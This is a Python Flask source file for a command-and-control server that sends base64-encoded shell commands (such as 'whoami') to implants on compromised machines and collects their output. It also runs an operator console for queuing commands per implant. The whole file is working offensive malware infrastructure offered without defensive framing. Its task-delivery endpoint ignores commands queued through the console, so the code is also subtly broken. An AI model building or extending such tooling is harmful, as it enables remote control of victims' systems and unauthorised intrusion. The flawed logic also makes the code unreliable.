import threading

from flask import Flask, jsonify, request

app = Flask(__name__)


# Track tasks + output per implant
tasks = {}  # This dictionary will store tasks for each implant
reports = {}  # This will store the reports/output from implants


# This is where you can hardcode tasks for specific implants
# You can specify commands directly here for each implant ID
hardcoded_tasks = {
    "815b650c-6827-422c-b5bd-560f27863007": "whoami",  # Task for this specific implant ID (have to check the implant server)
    "another-implant-id": "ls",  # Task for another implant ID, change as needed
}


@app.route("/task/<implant_id>", methods=["GET"])
def get_task(implant_id):
    print(f"[+] Request from implant {implant_id}")

    # If the implant ID is in the hardcoded_tasks dictionary, assign it a specific task
    task = hardcoded_tasks.get(implant_id, "whoami")  # specify the command to run here

    # Debugging line
    print(f"Returning task for {implant_id}: {task}")

    # Return the task as base64 encoded string
    return base64_encode(task), 200


@app.route("/task", methods=["POST"])
def set_task():
    data = request.json
    implant_id = data.get("id")
    task = data.get("task")

    if implant_id and task:
        encoded_task = base64_encode(task.strip())
        tasks[implant_id] = encoded_task
        print(f"Task for {implant_id} set to: {task.strip()}")  # Debugging line
        return "Task set", 200
    return "Missing ID or task", 400


@app.route("/report", methods=["POST"])
def receive_output():
    data = request.json
    implant_id = data.get("id")
    output = data.get("output")

    if implant_id and output:
        reports[implant_id] = output
        print(f"[+] Output from {implant_id}:\n{base64_decode(output)}\n")
        return "Received", 200
    return "Missing fields", 400


def base64_decode(data):
    import base64

    return base64.b64decode(data.encode()).decode()


def base64_encode(data):
    import base64

    return base64.b64encode(data.encode()).decode()


def c2_terminal():
    while True:
        cmd = input("C2> Enter implant_id and command (id:cmd): ")

        if ":" not in cmd:
            print("Format: id:command")
            continue

        implant_id, command = cmd.split(":", 1)

        # Encode the command in base64 and set it for the specific implant_id
        tasks[implant_id] = base64_encode(command.strip())

        # Print a debug message indicating the task has been set
        print(f"[+] Task for {implant_id} set to: {command.strip()}")


if __name__ == "__main__":
    # Start the C2 terminal thread to handle user input for tasks
    threading.Thread(target=c2_terminal, daemon=True).start()

    # Run Flask app
    app.run(host="0.0.0.0", port=8000)
